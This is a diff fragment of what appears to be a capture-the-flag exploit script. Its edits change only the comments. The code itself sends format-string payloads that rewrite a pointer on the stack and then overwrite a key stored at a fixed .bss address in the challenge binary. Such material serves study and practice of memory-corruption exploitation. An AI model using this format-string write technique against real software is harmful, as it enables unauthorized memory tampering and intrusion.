@@ -21,12 +21,12 @@ bss_ptr = stack_ptr + 0xc0 #0x60 <- local offset
 stack_ptr_arg = 21 + ((stack_ptr - arg21_addr) / 4)
 bss_ptr_arg = 21 + ((bss_ptr - arg21_addr) / 4)
 
-# printf episode #2 - adjust bss stack
+# printf episode #2 - modify bss pointer on stack
 _ = t.recvuntil('Give me some format strings(2)\n')
 key_bss_addr = 0x0804a060
 t.sendline('%{}c%{}$hn'.format(key_bss_addr & 0xffff, stack_ptr_arg))
 
-# printf episode #3 - override key
+# printf episode #3 - override key via modified bss pointer on stack
 _ = t.recvuntil('Give me some format strings(3)\n')
 t.sendline('%{}$lln'.format(bss_ptr_arg))
 
